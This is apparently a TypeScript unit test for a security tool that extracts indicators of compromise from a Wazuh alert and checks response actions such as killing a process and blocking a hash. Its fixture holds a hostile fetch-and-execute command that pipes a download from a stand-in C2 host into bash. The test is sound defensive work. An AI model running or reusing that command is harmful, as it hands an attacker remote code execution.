import { extractAlertIocs } from "../src/domain/investigation/alertIocs";
import { evaluateActionEvidence } from "../src/application/recommendation/services/ActionEvidence";

/** TC-08 (rule 100330) exactly as the Wazuh Indexer stores it: data.process cannot be a scalar (object-mapped), so
 *  the process lives under data.audit.* (captured from a live run, 2026-10-02). */
const SHA = "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64";
const CMD = "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash";
const realTc08 = {
  agent: { name: "attack-endpoint", id: "009", ip: "172.19.0.6" },
  rule: { id: "100330", level: 10 },
  data: {
    vigix: { event_type: "suspicious_process" },
    file: "/tmp/.cache/kworkerd", sha256: SHA, command: CMD,
    audit: { exe: "/tmp/.cache/kworkerd", pid: "1725", ppid: "1", parent: "tail", user: "www-data", uid: "33", command: CMD },
  },
};

describe("extractAlertIocs - Real-Wazuh TC-08 shape", () => {
  const iocs = extractAlertIocs(realTc08);
  const find = (t: string) => iocs.filter((i) => i.iocType === t);

  it("extracts PROCESS_NAME from data.audit.exe", () => {
    expect(find("PROCESS_NAME")).toEqual([{ iocType: "PROCESS_NAME", value: "/tmp/.cache/kworkerd", path: "data.audit.exe" }]);
  });
  it("still extracts the file path, SHA-256 and command line", () => {
    expect(find("FILE_PATH")[0]).toMatchObject({ value: "/tmp/.cache/kworkerd", path: "data.file" });
    expect(find("SHA256")[0]).toMatchObject({ value: SHA, path: "data.sha256" });
    expect(find("COMMAND_LINE")[0]).toMatchObject({ value: CMD, path: "data.command" });
  });
  it("does not turn pid / parent / user / uid into IOCs", () => {
    expect(iocs.map((i) => i.iocType).sort()).toEqual(["COMMAND_LINE", "FILE_PATH", "PROCESS_NAME", "SHA256"]);
  });
  it("is deduplicated against a scalar data.process with the same value (mock alert)", () => {
    const both = extractAlertIocs({ data: { process: "/tmp/.cache/kworkerd", audit: { exe: "/tmp/.cache/kworkerd" } } });
    expect(both.filter((i) => i.iocType === "PROCESS_NAME")).toHaveLength(1);
  });
  it("ignores a non-object / empty data.audit", () => {
    expect(extractAlertIocs({ data: { audit: "x" } })).toEqual([]);
    expect(extractAlertIocs({ data: { audit: { exe: "  " } } })).toEqual([]);
  });
});

describe("ActionEvidence over the extracted Real-Wazuh TC-08 IOCs (alert-linked evidence)", () => {
  const iocs = extractAlertIocs(realTc08).map((i) => ({ iocType: i.iocType, iocValue: i.value, manual: false })) as any;
  const ctx = { iocs, evidence: [{ host: "attack-endpoint", iocValues: iocs.map((i: any) => i.iocValue) }] as any, affectedHosts: ["attack-endpoint"] };
  it("ACT-KILL-PROCESS is satisfied on the process", () => {
    const r = evaluateActionEvidence(ctx, "ACT-KILL-PROCESS");
    expect(r).toMatchObject({ satisfied: true, targets: ["/tmp/.cache/kworkerd"] });
  });
  it("ACT-QUARANTINE-FILE and ACT-BLOCK-HASH remain satisfied", () => {
    expect(evaluateActionEvidence(ctx, "ACT-QUARANTINE-FILE").satisfied).toBe(true);
    expect(evaluateActionEvidence(ctx, "ACT-BLOCK-HASH").targets).toEqual([SHA]);
  });
});
